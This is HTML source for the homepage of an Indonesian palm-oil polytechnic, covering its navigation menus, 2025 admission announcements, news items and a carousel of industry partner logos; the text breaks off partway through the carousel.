  <script src="https://poltekcwe.ac.id/global/plugins/slider-revolution-slider/rs-plugin/js/jquery.themepunch.tools.min.js" type="text/javascript" defer></script>
  <script src="https://poltekcwe.ac.id/global/plugins/jquery.livequery.js" type="text/javascript"></script>
  <script src="https://poltekcwe.ac.id/frontend/pages/scripts/revo-slider-init.js" type="text/javascript"></script>
  <script src="https://poltekcwe.ac.id/frontend/layout/scripts/layout.js" type="text/javascript" defer></script>
  <script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=5fc59f5da1642e00120ca3c5&product=inline-share-buttons-buttons' async='async'></script>
</head>

<body class="corporate">
  <div class="pre-header">
    <div class="container">
      <div class="row">
        <div class="col-md-12 additional-shop-info">
          <ul class="list-unstyled list-inline">
            <li><i class="fa fa-whatsapp"></i><span><a href="https://web.whatsapp.com/send?phone=+6285213835168&amp;text=Halo, Saya ingin bertanya tentang Kampus Politeknik Kelapa Sawit Citra Widya Edukasi. Terimakasih." target="_blank">+6285213835168</a></span></li>
            <li><i class="fa fa-envelope-o"></i><span><a href="mailto:info@cwe.ac.id">
                  <email data-user="info" data-domain="cwe.ac.id"></email>
                </a></span>
            </li>
          </ul>
        </div>

      </div>
    </div>
  </div>
  <div class="header">
    <div class="container">
      <a class="site-logo" href="https://poltekcwe.ac.id/"><img src="https://poltekcwe.ac.id/img/icon/logo-cwe.png" alt="Politeknik Kelapa Sawit Citra Widya Edukasi"></a>
      <a href="javascript:void(0);" class="mobi-toggler"><i class="fa fa-bars"></i></a>
      <div class="header-navigation pull-right font-transform-inherit">
        <ul>

          <!-- BERANDA -->
          <li class="active"><a href="https://poltekcwe.ac.id/">BERANDA</a></li>

          <!-- TENTANG KAMI -->
          <li class="dropdown ">
            <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="javascript:;">
              TENTANG KAMI
            </a>
            <ul class="dropdown-menu">
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/sambutan-direktur-politeknik-kelapa-sawit-citra-widya-edukasi">Sambutan Direktur</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/sejarah-politeknik-kelapa-sawit-citra-widya-edukasi">Sejarah Kampus</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/visi-dan-misi-politeknik-kelapa-sawit-citra-widya-edukasi">Visi dan Misi</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/tujuan-politeknik-kelapa-sawit-citra-widya-edukasi">Tujuan Politeknik</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/struktur-organisasi-politeknik-kelapa-sawit-citra-widya-edukasi">Struktur Organisasi</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/lppm-politeknik-kelapa-sawit-citra-widya-edukasi">LPPM</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/tentang/fasilitas-kampus-politeknik-kelapa-sawit-citra-widya-edukasi">Fasilitas Kampus</a></li>
                          </ul>
          </li>

          <!-- PENDAFTARAN -->
          <li class="dropdown ">
            <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="javascript:;">
              PENDAFTARAN
            </a>
            <ul class="dropdown-menu">
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/jalur-pendaftaran-poltekcwe">Jalur Pendaftaran </a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/biaya-kuliah-dan-tata-cara-registrasi">Biaya Kuliah dan Tata Cara Registrasi</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/flyer-pendaftaran-citra-widya-edukasi">Flyer Pendaftaran</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/brosur-politeknik-kelapa-sawit-citra-widya-edukasi-2025">Brosur 2025</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/PENDAFTARAN-BEASISWA-SDM-PKS-TAHUN-2025">Beasiswa SDM PKS</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/beasiswa-kip-kuliah">Beasiswa KIP Kuliah</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/pendaftaran/ujian-masuk">Ujian Masuk</a></li>
                          </ul>
          </li>

          <!-- AKADEMIK -->
          <li class="dropdown ">
            <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="javascript:;">
              AKADEMIK
            </a>
            <ul class="dropdown-menu">
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/sarjana-terapan-teknik-informatika">Sarjana Terapan - Teknologi Rekayasa Perangkat Lunak</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/program-studi-teknologi-produksi-tanaman-perkebunan">Sarjana Terapan - Teknologi Produksi Tanaman Perkebunan</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/program-studi-budidaya-perkebunan-kelapa-sawit">D3 - Budidaya Perkebunan Kelapa Sawit</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/program-studi-teknologi-pengolahan-hasil-perkebunan-kelapa-sawit">D3 - Teknologi Pengolahan Hasil Perkebunan</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/program-studi-manajemen-logistik">D3 - Manajemen Logistik</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/kalender-akademik-politeknik-kelapa-sawit-citra-widya-edukasi">Kalender Akademik</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/peraturan-kampus-politeknik-kelapa-sawit-citra-widya-edukasi">Peraturan Kampus</a></li>
                              <li class=""><a href="https://poltekcwe.ac.id/akademik/program-pelatihan">Program Pelatihan</a></li>
              
              <!-- Matikan Bagian Ini Untuk Menghilangkan Menu Kemahasiswaan -->
              <li class=""><a href="https://poltekcwe.ac.id/informasi/kemahasiswaan-politeknik-kelapa-sawit-citra-widya-edukasi">Kemahasiswaan</a></li>
            </ul>
          </li>

           
          <!-- PORTAL APLIKASI -->
          <li class="dropdown ">
            <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="javascript:;">
              PORTAL APLIKASI
            </a>
            <ul class="dropdown-menu">
                              <li><a href="https://akademik.poltekcwe.ac.id/" target="_blank">Portal Akademik</a></li>
                              <li><a href="https://perpuscwe.poltekcwe.ac.id/" target="_blank">Perpustakaan Poltek CWE</a></li>
                              <li><a href="https://digilib.poltekcwe.ac.id/" target="_blank">Digilib Poltek CWE</a></li>
                              <li><a href="https://tracerstudy.kemdiktisaintek.go.id/kuesioner" target="_blank">Tracer Study</a></li>
                              <li><a href="https://keuangan.poltekcwe.ac.id" >Keuangan Poltek CWE </a></li>
                          </ul>
          </li>

          <!-- GALERI -->
          <li class="dropdown ">
            <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="javascript:;">
              GALERI
            </a>
            <ul class="dropdown-menu">
              <!--<li class=""><a href="https://poltekcwe.ac.id/galeri/foto">Galeri Foto</a></li>-->
              <li class=""><a href="https://poltekcwe.ac.id/galeri/video">Galeri Video</a></li>
              <li class=""><a href="https://poltekcwe.ac.id/galeri/komik">Komik</a></li>
            </ul>
          </li>

          <!--DAFTAR ONLINE-->
          <li class="bg-yellow"><a href="https://bit.ly/daftarpoltekCWE2023"><span class="custom-blue-color">PENDAFTARAN ONLINE</span></a></li>

        </ul>
      </div>
    </div>
  </div>

  <!-- DEBUG-VIEW START 1 APPPATH/Views/front/home.php -->
    
    <!-- SLIDER START -->
    <div class="page-slider margin-bottom-40">
      <div class="fullwidthbanner-container revolution-slider">
        <div class="fullwidthabnner">
          <ul id="revolutionul"> <!--data-masterspeed awal=700 delay=9400-->
                          <li data-transition="fade" data-slotamount="8" data-masterspeed="450" data-delay="4800" data-thumb="https://poltekcwe.ac.id/img/slider/1742425679_f0d0dd42f82717748fc3.png">
                <img src="https://poltekcwe.ac.id/img/slider/1742425679_f0d0dd42f82717748fc3.png" alt="PMB Politeknik Kelapa Sawit Citra Widya Edukasi 2023/2024">
              </li>
                          <li data-transition="fade" data-slotamount="8" data-masterspeed="450" data-delay="4800" data-thumb="https://poltekcwe.ac.id/img/slider/1742433716_c454481694491bcab377.png">
                <img src="https://poltekcwe.ac.id/img/slider/1742433716_c454481694491bcab377.png" alt="Penerimaan Mahasiswa Baru TRPL Tahun Akademik 2023/2024">
              </li>
                          <li data-transition="fade" data-slotamount="8" data-masterspeed="450" data-delay="4800" data-thumb="https://poltekcwe.ac.id/img/slider/1742434106_7e36a563a1d6098e9e3c.png">
                <img src="https://poltekcwe.ac.id/img/slider/1742434106_7e36a563a1d6098e9e3c.png" alt="Update">
              </li>
                          <li data-transition="fade" data-slotamount="8" data-masterspeed="450" data-delay="4800" data-thumb="https://poltekcwe.ac.id/img/slider/1742434193_25fadac0d947dce5a27b.png">
                <img src="https://poltekcwe.ac.id/img/slider/1742434193_25fadac0d947dce5a27b.png" alt="Unit Kegiatan Mahasiswa CWE">
              </li>
                          <li data-transition="fade" data-slotamount="8" data-masterspeed="450" data-delay="4800" data-thumb="https://poltekcwe.ac.id/img/slider/1742434471_7500039a24b90113aefc.png">
                <img src="https://poltekcwe.ac.id/img/slider/1742434471_7500039a24b90113aefc.png" alt="Gedung &amp; Fasilitas CWE">
              </li>
                      </ul>
        </div>
      </div>
    </div>
    <!-- SLIDER END -->

    <!-- TOP INFORMATION START -->
    <div class="main panel-1">
      <div class="container">
        <div class="row service-box">
          <div class="text-center padding-top-20">
            <p class="welcome-p">Welcome to</p>            <h1 class="welcome-h-mo">Politeknik Kelapa Sawit<br>Citra Widya Edukasi</h1>          </div>
        </div>
        <div class="row service-box margin-bottom-40 break-20">
          <div class="col-md-4 col-sm-4">
            <div class="service-box-heading">
              <em><i class="fa fa-location-arrow blue"></i></em>
              <span class="text-center">DUNIA KAMPUS</span>
            </div>
            <p>
              <p style="text-align: justify;">Berada di lingkungan di &nbsp;kampus Politeknik Kelapa Sawit Citra Widya Edukasi&nbsp; tak ubahnya&nbsp; seperti kembali ke kampung halaman. Suasananya sepi dan tenang, lingkungannya yang hijau dan bersih, sangat&nbsp; ...
            </p>
            <div class="text-right"><a href="https://poltekcwe.ac.id/informasi/dunia-kampus-politeknik-kelapa-sawit-citra-widya-edukasi" title="Dunia Kampus Selengkapnya..."><i class="fa fa-angle-double-right fa-2x"></i><i class="fa fa-angle-double-right fa-2x"></i><i class="fa fa-angle-double-right fa-2x"></i></a></div>
          </div>
          <div class="col-md-4 col-sm-4">
            <div class="service-box-heading">
              <em><i class="fa fa-check red"></i></em>
              <span>KEUNGGULAN KAMPUS</span>
            </div>
            <p>
              <p style="text-align: justify;">Industri kelapa sawit di dunia, terutama CPO (crude palm oil) terus menunjukkan tren positif. Permintaan minyak kelapa sawit kian meningkat dari tahun ke tahun. Posisi strategis ini semakin terasa sejak tahun 2005. Di  ...
            </p>
            <div class="text-right"><a href="https://poltekcwe.ac.id/informasi/keunggulan-politeknik-kelapa-sawit-citra-widya-edukasi" title="Keunggulan Kampus Selengkapnya..."><i class="fa fa-angle-double-right fa-2x"></i><i class="fa fa-angle-double-right fa-2x"></i><i class="fa fa-angle-double-right fa-2x"></i></a></div>
          </div>
          <div class="col-md-4 col-sm-4">
            <div class="service-box-heading">
              <em><i class="fa fa-compress green"></i></em>
              <span>INFO BEASISWA</span>
            </div>
            <p>
              <p style="text-align: justify;">Kehadiran Politeknik Kelapa Sawit CWE yang memiliki tujuan dan orientasi yang jelas serta terfokus pada industri kelapa sawit merupakan kebutuhan yang amat mendesak untuk menyediakan sumber daya manusia kelapa sawit ya ...
            </p>
            <div class="text-right"><a href="https://poltekcwe.ac.id/informasi/info-beasiswa-politeknik-kelapa-sawit-citra-widya-edukasi" title="Info Beasiswa Selengkapnya..."><i class="fa fa-angle-double-right fa-2x"></i><i class="fa fa-angle-double-right fa-2x"></i><i class="fa fa-angle-double-right fa-2x"></i></a></div>
          </div>
        </div>
      </div>
    </div>
    <!-- TOP INFORMATION END -->

    <!-- MID CONTENT START -->
    <div class="main break-20">
      <div class="container">

        <div class="row recent-work margin-bottom-10">
          <!-- VIDEO PROFIL START -->
          <div class="col-md-3 col-sm-3">
            <div class="text-center">
              <h3>VIDEO PROFIL</h3>
            </div>
            <div class="embed-responsive video-profil">
              <a href="https://youtu.be/bL-CpbKXahA" target="_blank" title="Video Profil Politeknik Kelapa Sawit Citra Widya Edukasi"><img class="img-responsive" src="https://poltekcwe.ac.id/img/youtube//video-profil-politeknik-kelapa-sawit-citra-widya-edukasi.jpg" alt="Video Profil Politeknik Kelapa Sawit Citra Widya Edukasi"></a>
            </div>
            <br><br><br><br>
          </div>
          <!-- VIDEO PROFIL END -->
          <!-- BERITA START -->
          <!-- BERITA START -->
          <div class="col-md-9 col-sm-9">
            <div class="text-center">
              <h3>BERITA TERKINI</h3>
            </div>
            <div class="owl-carousel d-berita">
              <div class="owl-wrapper-outer">
                <div class="owl-wrapper d-berita-owl">
                  <div class="row">
                                                                                      <div class="col-md-4 col-sm-4">
                          <div class="owl-item active width-100">
                            <div class="recent-work-item">
                              <em>
                                                                  <img src="https://poltekcwe.ac.id/img/berita/1742370611_90990e84a801bd15dc78.jpeg" alt="Kuliah Umum : Temu Praktisi - Ruang Lingkup dan Perkembangan Sistem Informasi Geografis Perkebunan Kelapa Sawit di Indonesia" class="img-responsive width-100" style="object-fit: cover; height: 189px;">
                                                                <a href="https://poltekcwe.ac.id/berita/kuliah-umum-temu-praktisi-ruang-lingkup-dan-perkembangan-sistem-informasi-geografis-perkebunan-kelapa-sawit-di-indonesia"><i class="fa fa-link"></i></a>

                                                                  <a href="https://poltekcwe.ac.id/img/berita/1742370611_90990e84a801bd15dc78.jpeg" class="fancybox-button" title="Kuliah Umum : Temu Praktisi - Ruang Lingkup dan Perkembangan Sistem Informasi Geografis Perkebunan Kelapa Sawit di Indonesia" data-rel="fancybox-button"><i class="fa fa-search"></i></a>
                                
                              </em>

                              <a class="recent-work-description" href="https://poltekcwe.ac.id/berita/kuliah-umum-temu-praktisi-ruang-lingkup-dan-perkembangan-sistem-informasi-geografis-perkebunan-kelapa-sawit-di-indonesia">
                                <strong>Kuliah Umum : Temu Praktisi - Ruang Lingkup dan Perkembangan Sistem Informasi Geografis Perkebunan Kelapa Sawit di Indonesia</strong>
                              </a>

                            </div>
                          </div>
                        </div>
                                                                    <div class="col-md-4 col-sm-4">
                          <div class="owl-item active width-100">
                            <div class="recent-work-item">
                              <em>
                                                                  <img src="https://poltekcwe.ac.id/img/berita/1742370406_a9e8e464d1f3eefa78e7.jpeg" alt="Kunjungan Campus Tour SMAN 2 Gunung Putri ke Kampus Politeknik Kelapa Sawit CWE" class="img-responsive width-100" style="object-fit: cover; height: 189px;">
                                
                                <a href="https://poltekcwe.ac.id/berita/kunjungan-campus-tour-sman-2-gunung-putri-ke-kampus-politeknik-kelapa-sawit-cwe"><i class="fa fa-link"></i></a>

                                                                  <a href="https://poltekcwe.ac.id/img/berita/1742370406_a9e8e464d1f3eefa78e7.jpeg" class="fancybox-button" title="Kunjungan Campus Tour SMAN 2 Gunung Putri ke Kampus Politeknik Kelapa Sawit CWE" data-rel="fancybox-button"><i class="fa fa-search"></i></a>
                                
                              </em>

                              <a class="recent-work-description" href="https://poltekcwe.ac.id/berita/kunjungan-campus-tour-sman-2-gunung-putri-ke-kampus-politeknik-kelapa-sawit-cwe">
                                <strong>Kunjungan Campus Tour SMAN 2 Gunung Putri ke Kampus Politeknik Kelapa Sawit CWE</strong>
                              </a>

                            </div>
                          </div>
                        </div>
                                                                  <div class="col-md-4 col-sm-4">
                          <div class="owl-item active width-100">
                            <div class="recent-work-item">
                              <em>
                                                                  <img src="https://poltekcwe.ac.id/img/berita/1742370100_419843345de1450a4d53.jpeg" alt="TEKPRO NASIONAL COMPETITION (TENACO) LOMBA NASIONAL Yang di selenggarakan Prodi TPTP" class="img-responsive width-100" style="object-fit: cover; height: 189px;">
                                
                                <a href="https://poltekcwe.ac.id/berita/tekpro-nasional-competition-tenaco-lomba-nasional-yang-di-selenggarakan-prodi-tptp"><i class="fa fa-link"></i></a>

                                                                  <a href="https://poltekcwe.ac.id/img/berita/1742370100_419843345de1450a4d53.jpeg" class="fancybox-button" title="TEKPRO NASIONAL COMPETITION (TENACO) LOMBA NASIONAL Yang di selenggarakan Prodi TPTP" data-rel="fancybox-button"><i class="fa fa-search"></i></a>
                                
                              </em>

                              <a class="recent-work-description" href="https://poltekcwe.ac.id/berita/tekpro-nasional-competition-tenaco-lomba-nasional-yang-di-selenggarakan-prodi-tptp">
                                <strong>TEKPRO NASIONAL COMPETITION (TENACO) LOMBA NASIONAL Yang di selenggarakan Prodi TPTP</strong>
                              </a>

                            </div>
                          </div>
                        </div>
                                      </div>
                </div>
              </div>
            </div>
          </div>
          <!-- BERITA END -->
          <!-- BERITA END -->
        </div>

        <!-- KUY MELUNCUR START -->
        <div class="row quote-v1 margin-bottom-40">
          <div class="col-md-9">
            <span>Lihat Informasi Menarik Lainnya, Kunjungi Halaman Berita!</span>
          </div>
          <div class="col-md-3 text-right">
            <a class="btn-transparent" href="https://poltekcwe.ac.id/berita"><i class="fa fa-rocket margin-right-10"></i>Kuy, Meluncur!</a>
          </div>
        </div>
        <!-- KUY MELUNCUR END -->


        <div class="row recent-work margin-bottom-40">
          <!-- BOTTOM INFORMATION START -->
          <div class="col-md-8 tab-style-1">
            <ul class="nav nav-tabs">
              <li class="active"><a href="#tab-1" data-toggle="tab">PENGUMUMAN</a></li>
              <li><a href="#tab-2" data-toggle="tab">KEGIATAN</a></li>
              <!--<li><a href="#tab-3" data-toggle="tab">PENDAFTARAN</a></li>-->
              <li><a href="#tab-4" data-toggle="tab">KEMAHASISWAAN</a></li>
              <li><a href="#tab-5" data-toggle="tab">PORTAL ALUMNI</a></li>
            
            </ul>
            <div class="tab-content">
              <div class="tab-pane row fade in active" id="tab-1">
                <div class="col-md-3 col-sm-3">
                  <a href="https://poltekcwe.ac.id/img/galleri2.jpg" class="fancybox-button" title="Politeknik Kelapa Sawit Citra Widya Edukasi" data-rel="fancybox-button">
                    <img class="img-responsive" src="https://poltekcwe.ac.id/img/informasi/110.jpg" alt="Logo Politeknik Kelapa Sawit Citra Widya Edukasi">
                  </a>
                </div>
                <div class="col-md-9 col-sm-9">
                  <p class="margin-bottom-10"> <p>PENERIMAAN CALON MAHASISWA BARU TAHUN AKADEMIK 2025/2026 GELOMBANG 2 TELAH DIBUKA DENGAN BATAS PENDAFTARAN 30 APRIL 2025. INFO LEBIH LANJUT HUBUNGI BUDI RAHARJO WIBOWO, CP : 0852-1383-5168</p></p>
                  <p><a class="more" href="https://poltekcwe.ac.id/informasi/pengumuman-politeknik-kelapa-sawit-citra-widya-edukasi">Selengkapnya <i class="icon-angle-right"></i></a></p>
                </div>
              </div>
              
              
              <div class="tab-pane row fade" id="tab-2">
                <div class="col-md-3 col-sm-3">
                  <a href="https://poltekcwe.ac.id/img/galleri2.jpg" class="fancybox-button" title="Politeknik Kelapa Sawit Citra Widya Edukasi" data-rel="fancybox-button">
                    <img class="img-responsive" src="https://poltekcwe.ac.id/img/informasi/110.jpg" alt="Logo Politeknik Kelapa Sawit Citra Widya Edukasi">
                  </a>
                </div>
                <div class="col-md-9 col-sm-9">
                  <p class="margin-bottom-10"> <p>Dunia perkebunan di Indonesia sudah memasuki era baru dengan pengaplikasian teknologi informasi berbasis spasial. Semua aktivitas kebun akan mengaplikasikan teknologi informasi geografis, seperti p</p>
                  <p><a class="more" href="https://poltekcwe.ac.id/informasi/info-kegiatan-politeknik-kelapa-sawit-citra-widya-edukasi">Selengkapnya <i class="icon-angle-right"></i></a></p>
                </div>
              </div>
              
              
              <div class="tab-pane row fade" id="tab-3">
                <div class="col-md-3 col-sm-3">
                  <a href="https://poltekcwe.ac.id/img/galleri2.jpg" class="fancybox-button" title="Politeknik Kelapa Sawit Citra Widya Edukasi" data-rel="fancybox-button">
                    <img class="img-responsive" src="https://poltekcwe.ac.id/img/informasi/110.jpg" alt="Logo Politeknik Kelapa Sawit Citra Widya Edukasi">
                  </a>
                </div>
                <div class="col-md-9 col-sm-9">
                  <p class="margin-bottom-10"> <p style="text-align: justify;">Jika ada kendala terkait link pendaftaran, silahkan menggunakan link alternatif :</p>
<a href="https://poltekcwe.ac.id/pendaftaran/jalur-pendaftaran-poltekcwe</a>
</p>
                  <p><a class="more" href="https://poltekcwe.ac.id/informasi/pendaftaran-politeknik-kelapa-sawit-citra-widya-edukasi">Selengkapnya <i class="icon-angle-right"></i></a></p>
                </div>
              </div>
              
              
              <div class="tab-pane row fade" id="tab-4">
                <div class="col-md-3 col-sm-3">
                  <a href="https://poltekcwe.ac.id/img/galleri2.jpg" class="fancybox-button" title="Politeknik Kelapa Sawit Citra Widya Edukasi" data-rel="fancybox-button">
                    <img class="img-responsive" src="https://poltekcwe.ac.id/img/informasi/110.jpg" alt="Logo Politeknik Kelapa Sawit Citra Widya Edukasi">
                  </a>
                </div>
                <div class="col-md-9 col-sm-9">
                  <p class="margin-bottom-10"> <p style="text-align: justify;"><strong><strong>A. DEWAN PERWAKILAN MAHASISWA (DPM)</strong></strong></p>
<p style="text-align: justify;">Dewan Perwakilan Mahasiswa Politeknik Kelapa Sawit Citra Widy</p>
                  <p><a class="more" href="https://poltekcwe.ac.id/informasi/kemahasiswaan-politeknik-kelapa-sawit-citra-widya-edukasi">Selengkapnya <i class="icon-angle-right"></i></a></p>
                </div>
              </div>
              
              
              <div class="tab-pane row fade" id="tab-5">
                <div class="col-md-3 col-sm-3">
                  <a href="https://poltekcwe.ac.id/img/galleri2.jpg" class="fancybox-button" title="Politeknik Kelapa Sawit Citra Widya Edukasi" data-rel="fancybox-button">
                    <img class="img-responsive" src="https://poltekcwe.ac.id/img/informasi/110.jpg" alt="Logo Politeknik Kelapa Sawit Citra Widya Edukasi">
                  </a>
                </div>
                <div class="col-md-9 col-sm-9">
                  <p class="margin-bottom-10"> <p style="text-align: justify;">Politeknik Kelapa Sawit Citra Widya Edukasi telah meluluskan 16 Angkatan dengan Gelar Ahli Madya dan 2 Angkatan untuk Gelar Sarjana Terapan serta Sudah Lebih dari 1870 </p>
                  <p><a class="more" href="https://poltekcwe.ac.id/informasi/alumni-politeknik-kelapa-sawit-citra-widya-edukasi">Selengkapnya <i class="icon-angle-right"></i></a></p>
                </div>
              </div>
            </div>
          </div>
          <!-- BOTTOM INFORMATION END -->

          <!-- LAYANAN ONLINE START -->
          <div class="col-md-4">
            <div class="break-btm-20 mt-custom-layanan">
              <h3></h3>
            </div>
            <div class="break-btm-20">
                              <a href="https://poltekcwe.ac.id/pendaftaran/PENDAFTARAN-BEASISWA-SDM-PKS-TAHUN-2025" target="_blank" class="btn btn-warning btn-block btn-layanan"> BEASISWA SDMPKS 2025</a>
                              <a href="https://g.page/polteksawit?share" target="_blank" class="btn btn-warning btn-block btn-layanan"> LOKASI KAMPUS (MAP)</a>
                              <a href="https://poltekcwe.ac.id/pendaftaran/brosur-politeknik-kelapa-sawit-citra-widya-edukasi-2025" target="_blank" class="btn btn-warning btn-block btn-layanan"> BROSUR 2025</a>
                          </div>
          </div>
          <!-- LAYANAN ONLINE END -->
        </div>

      </div>
    </div>
    <!-- MID CONTENT END -->

    <!-- CLIENT START -->
    <div class="main">
      <div class="container">
        <div class="row margin-bottom-40 our-clients">
          <div class="col-md-12 text-center margin-bottom-10">
            <div class="client-line">
              <h3 class="client-font">MITRA KERJASAMA</h3>
            </div>
          </div>
          <div class="col-md-12">
            <div class="owl-carousel owl-carousel6-brands">
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT ATMI IGI Center.png" class="img-responsive" alt="PT ATMI IGI Center.png">
                    <img src="img/clients/PT ATMI IGI Center.png" class="color-img img-responsive" alt="PT ATMI IGI Center.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Best Agro Inter.png" class="img-responsive" alt="PT Best Agro Inter.png">
                    <img src="img/clients/PT Best Agro Inter.png" class="color-img img-responsive" alt="PT Best Agro Inter.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Citra Borneo Indah.png" class="img-responsive" alt="PT Citra Borneo Indah.png">
                    <img src="img/clients/PT Citra Borneo Indah.png" class="color-img img-responsive" alt="PT Citra Borneo Indah.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Daria Dharma Pratama.png" class="img-responsive" alt="PT Daria Dharma Pratama.png">
                    <img src="img/clients/PT Daria Dharma Pratama.png" class="color-img img-responsive" alt="PT Daria Dharma Pratama.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Hai Sawit Indonesia.png" class="img-responsive" alt="PT Hai Sawit Indonesia.png">
                    <img src="img/clients/PT Hai Sawit Indonesia.png" class="color-img img-responsive" alt="PT Hai Sawit Indonesia.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Hartono Plantations Indonesia.png" class="img-responsive" alt="PT Hartono Plantations Indonesia.png">
                    <img src="img/clients/PT Hartono Plantations Indonesia.png" class="color-img img-responsive" alt="PT Hartono Plantations Indonesia.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Indotech Trimitra Abadi.png" class="img-responsive" alt="PT Indotech Trimitra Abadi.png">
                    <img src="img/clients/PT Indotech Trimitra Abadi.png" class="color-img img-responsive" alt="PT Indotech Trimitra Abadi.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Julong Group.png" class="img-responsive" alt="PT Julong Group.png">
                    <img src="img/clients/PT Julong Group.png" class="color-img img-responsive" alt="PT Julong Group.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Manakarra Unggul Lestari.png" class="img-responsive" alt="PT Manakarra Unggul Lestari.png">
                    <img src="img/clients/PT Manakarra Unggul Lestari.png" class="color-img img-responsive" alt="PT Manakarra Unggul Lestari.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Rea Kaltim.png" class="img-responsive" alt="PT Rea Kaltim.png">
                    <img src="img/clients/PT Rea Kaltim.png" class="color-img img-responsive" alt="PT Rea Kaltim.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT SKF Training Solutions.png" class="img-responsive" alt="PT SKF Training Solutions.png">
                    <img src="img/clients/PT SKF Training Solutions.png" class="color-img img-responsive" alt="PT SKF Training Solutions.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Spice Island Mandiri.png" class="img-responsive" alt="PT Spice Island Mandiri.png">
                    <img src="img/clients/PT Spice Island Mandiri.png" class="color-img img-responsive" alt="PT Spice Island Mandiri.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Sumber Tani Agung.png" class="img-responsive" alt="PT Sumber Tani Agung.png">
                    <img src="img/clients/PT Sumber Tani Agung.png" class="color-img img-responsive" alt="PT Sumber Tani Agung.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Tani Prima Makmur.png" class="img-responsive" alt="PT Tani Prima Makmur.png">
                    <img src="img/clients/PT Tani Prima Makmur.png" class="color-img img-responsive" alt="PT Tani Prima Makmur.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Tempopress International Delivery.png" class="img-responsive" alt="PT Tempopress International Delivery.png">
                    <img src="img/clients/PT Tempopress International Delivery.png" class="color-img img-responsive" alt="PT Tempopress International Delivery.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Yamato Indonesia Forwarding.png" class="img-responsive" alt="PT Yamato Indonesia Forwarding.png">
                    <img src="img/clients/PT Yamato Indonesia Forwarding.png" class="color-img img-responsive" alt="PT Yamato Indonesia Forwarding.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT Unggul Widya Teknologi Lestari.png" class="img-responsive" alt="PT Unggul Widya Teknologi Lestari.png">
                    <img src="img/clients/PT Unggul Widya Teknologi Lestari.png" class="color-img img-responsive" alt="PT Unggul Widya Teknologi Lestari.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT. Damai Plantation.png" class="img-responsive" alt="PT. Damai Plantation.png">
                    <img src="img/clients/PT. Damai Plantation.png" class="color-img img-responsive" alt="PT. Damai Plantation.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT. Grand Utama Mandiri.jpg" class="img-responsive" alt="PT. Grand Utama Mandiri.jpg">
                    <img src="img/clients/PT. Grand Utama Mandiri.jpg" class="color-img img-responsive" alt="PT. Grand Utama Mandiri.jpg">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT. Incasi Raya Group.png" class="img-responsive" alt="PT. Incasi Raya Group.png">
                    <img src="img/clients/PT. Incasi Raya Group.png" class="color-img img-responsive" alt="PT. Incasi Raya Group.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT. Mulia Inti Perkasa.png" class="img-responsive" alt="PT. Mulia Inti Perkasa.png">
                    <img src="img/clients/PT. Mulia Inti Perkasa.png" class="color-img img-responsive" alt="PT. Mulia Inti Perkasa.png">
                  </a>
                </div>
                              <div class="client-item">
                  <a href="javascript:;">
                    <img src="img/clients/PT. Triputra Agro Persada.png" class="img-responsive" alt="PT. Triputra Agro Persada.png">
